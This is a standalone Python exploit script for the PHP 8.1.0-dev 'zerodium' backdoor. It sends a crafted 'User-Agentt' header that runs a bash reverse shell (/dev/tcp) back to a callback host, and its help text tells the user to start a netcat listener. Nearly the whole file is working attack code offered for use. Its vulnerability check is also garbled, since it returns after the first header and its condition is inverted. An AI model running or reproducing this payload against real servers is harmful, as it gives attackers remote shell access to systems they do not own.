# Deranged0tter
# usage: python exploit.py -t <target-address> -P <target-port (default 80)> -l <callback-host> -p <callback-port (default 4455)>

import argparse
import requests

request = requests.Session()

def check(target_address: str) -> bool:
    response = request.get(target_address)
    for header in response.headers.items():
        if "PHP/8.1.0-dev" in header[1]:
            return True
        else:
            return False

def exploit(target_address: str, lhost: str, lport: str):
    payload = 'bash -c \"bash -i >& /dev/tcp/' + lhost + '/' + lport + ' 0>&1\"'
    
    request.get(target_address, headers={"User-Agentt": "zerodiumsystem('" + payload + "');"}, allow_redirects=False)

def main():
    # define parser
    parser = argparse.ArgumentParser(prog="exploit.py", description="used to get a reverse shell on target's running PHP 8.1.0-dev\nEnsure you are running a netcat listener: `nc -lnvp <callback-port>`")

    # define arguments
    parser.add_argument("-t", "--target", dest="target", required=True)
    parser.add_argument("-P", "--target-port", dest="t_port", required=False, default="80")
    parser.add_argument("-l", "--lhost", dest="lhost", required=True)
    parser.add_argument("-p", "--lport", dest="lport", required=False, default="4455")
    parser.add_argument("-o", "--override", dest="override", required=False, action="store_true")

    # parse arguments
    args = parser.parse_args()

    # define target
    t_address = "http://" + args.target + ":" + args.t_port + "/"

    # check if vulnerable
    if not args.override:
        isVuln = check(t_address)
        if isVuln:
            print("Target does not appear to be vulnerable, run with -o to override this. exiting...")
            exit

    # exploit
    exploit(t_address, args.lhost, args.lport)

    print("exploit completed successfully...")
    exit


if __name__ == "__main__":
    main()